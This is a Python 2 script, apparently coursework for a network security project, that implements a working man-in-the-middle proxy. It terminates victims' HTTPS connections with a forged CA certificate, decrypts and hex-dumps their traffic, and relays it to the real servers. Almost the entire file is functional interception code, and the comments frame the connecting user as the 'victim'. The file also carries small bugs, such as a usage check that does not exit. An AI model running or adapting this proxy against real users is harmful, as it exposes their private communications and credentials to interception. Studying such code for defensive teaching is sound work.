from socket import *
import ssl
import threading
import time
import re 
import httplib
import struct
import string
import os
import sys
import socket as Socket
import select

class handler(threading.Thread):
	def __init__(self,socket, port) :
		threading.Thread.__init__(self)
		self.socket=socket
		self.default_port = port
		# A flag to denote ssl state
		self.sslenable = False

	def initSSLConnection(self, clientSocket):
		# Use your fake certificate to establish connection to victim
		# This function should use 
		# 1. send back "HTTP/1.1 200 Connection established\r\n\r\n"
		# 2. use  ssl.wrap_socket to establish ssl-wrap socket connect to victim(use fake certificate )
		# 3. return the ssl-wrap socket 
		# ======== Your Code Here!! =======================
		clientSocket.send("HTTP/1.1 200 Connection established\r\n\r\n")
		wsock = ssl.wrap_socket(clientSocket, "myCA.key", "myCA.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2)

		return wsock
	
	def CreateSocketAndConnectToOriginDst(self , host, port):
		# if the port is not 443(http), create socket dirrect connect to the original website
		# if port is 443, create ssl.wrap_socket socket and connect to origin website
		# return the socket or wrap socket
		# ======== Your Code Here!! =======================
		sock = socket()
		if self.sslenable == True:
			sock = ssl.wrap_socket(sock)

                print host
                addr = Socket.gethostbyname(host)
		sock.connect((addr, port))
		return sock

	def ReadLine(self,SourceSock):
		# This function read a line from socket
		line = ""
		while True:
			char = SourceSock.recv(1)
			line += char
			if not line.find("\r\n") == -1 :
				return line

	def ReadNum(self,SourceSock,length):
		# read data with lenth from SourceSock
		line = ""
		while len(line) < length:
			char = SourceSock.recv(1)
			line += char
		return line

	def ReadHeader(self,SourceSock):
		#This function read the http header from socket
		header = ""
                line = SourceSock.recv(1)
                if not line:
                    return

                data = line
                while len(line) :
                        line = SourceSock.recv(1)
                        data += line
                        if not data.find("\r\n\r\n")==-1 :
                                header = data
                                data = ""
                                break;
                dicHeader = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", header))
                #print dicHeader
                for (k,v) in dicHeader.items():
                        print k,":",v
		return dicHeader, header

	def ReadHttp(self,SourceSock):
		# Read whole Http packet, and return header and body in string type
		#dicHeader, header = self.ReadHeader(SourceSock)
                res = self.ReadHeader(SourceSock)
                
                if not res:
                    return
                
                dicHeader = res[0]
                header = res[1]

		body = ""
		if 'Transfer-Encoding' in dicHeader and dicHeader['Transfer-Encoding'] == 'chunked' :
			while True :
				line = self.ReadLine(SourceSock)
				body += line
				chunkSize = int(line,16)
				if chunkSize == 0 : 
					break
				line = self.ReadNum(SourceSock,chunkSize+2)
				body += line
		else :
			if 'Content-Length' in dicHeader :
				length = int(dicHeader['Content-Length'])
			else :
				length = 0

			while length>0 :
				line = SourceSock.recv(1)
				length -= len(line)
				body += line

	        self.PrinfContent(body)
		return header,body

	def PrinfContent(self,content):
		index = 0
		part = 0x10
		print '[PrintContent]'
		
		while index < len(content) :
			length = part if len(content)-index >= part else len(content)-index
			print "%08d" % index ,
			for i in range(index,index+length):
				print content[i:i+2].encode('hex').upper(),
				i += 1
			print_str=""
			for i in range(index,index+length):
				if content[i] not in string.printable or content[i] in {'\n','\r','\t'}:
					print_str+='.'
				else:
					print_str+=content[i]
			print print_str

			index+=length

	def getHostFromHeader(self, header):
		# Parsing first http packet and find 
		# 1) if ssl enable, if header contain "CONNECT 192.168.6.131:443 HTTP/1.1"
		#	then it is https connection, and port and host are return	 
		# 2) port need to connect
		# 3) host need to conect
		if 'CONNECT' in header:
			self.sslenable = True
		#print "The header is: "+header
		tokens = str(header).split('\r\n')
		tokens = tokens[1].split(' ')
		host = tokens[1]
		
		if self.sslenable == True:
			port = 443
		else:
			port = 80
		
		return host,port

	def run(self):
		# The main function for MITM
		# You need to do 
		# 1. read http request sent from victim, and use getHostFromHeader to reveal host and port of target website
		# 2. if ssl is enabled, you should use initSSLConnection() to create ssl wrap socket 
		# 2.1 if ssl is enabled, you should receive the real request from client by ReadHTTP() 
		# 3. create a fakeSocket and connect to website which victim want to connect
		# ==============Your Code Here !! ====================================
		request = self.ReadHttp(self.socket)
		host,port = self.getHostFromHeader(request[0])
		
                if ("icloud" in host) or ("dropbox" in host):
                        return
		if self.sslenable == True:
                        try:
			    self.socket = self.initSSLConnection(self.socket)
			    request = self.ReadHttp(self.socket)
			    host,port = self.getHostFromHeader(request[0])
                        except Exception as ex:
                            print host
                            print ex

                        #print "ssl is enable"
		
		#if host.rstrip() != "140.113.207.95":
			#print "return!!!!!!!!!!!!!"
			#return
		rsock = self.CreateSocketAndConnectToOriginDst(host, int(port))

		print "==================== Client Request  ================================"
		# 4. Forward the request sent by user to the fakeSocket
		# ==============Your Code Here !! ====================================
		rsock.send(request[0]+request[1])

		print "Client Request Forwarding Success"
		print "==================== server response  ================================"
		# 5. Read response from fakeSocket and forward to victim's socket
		# 6. close victim's socket and fakeSocket
		# ==============Your Code Here !! ====================================
		response = self.ReadHttp(rsock)
		self.socket.send(response[0]+response[1])
                
                inputs = [ rsock, self.socket ]
                outputs = []
                while True:
                    readable, writable, exceptional = select.select(inputs, outputs, inputs)
                    for s in readable:
                        if s is rsock:
                            print '{0} {1} read server'.format(host, port)
                            #rsock.setblocking(True)
                            res = self.ReadHttp(s)
                            if res:
                                self.socket.send(res[0] + res[1])
                            else:
                                print '{0} {1} server close'.format(host, port)
                                self.socket.close()
                                rsock.close()
                                return
                        else:
                            print '{0} {1} read client'.format(host, port)
                            #self.socket.setblocking(True)
                            res = self.ReadHttp(self.socket)
                            if res:
                                rsock.send(res[0] + res[1])
                            else:
                                print '{0} {1} client close'.format(host, port)
                                self.socket.close()
                                rsock.close()
                                return

		#self.socket.close()
		#rsock.close()
		
		print "Connection Finished"

if not len(sys.argv) == 2 :
    print "This program is Template of Proxy Level MITM Attack"
    print "This program is part of Network Security Project"
    print "Usage: python mitm.py <your address> <port>"
ip = sys.argv[1]
port = int(sys.argv[2])
bindAddress = (ip , port)

serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(bindAddress)
serverSocket.listen(1)
threads = []
data_dir = "/home/netsec/MITM-master/"

while True :
	clientSocket,addr = serverSocket.accept()
	handler(clientSocket, port).start()


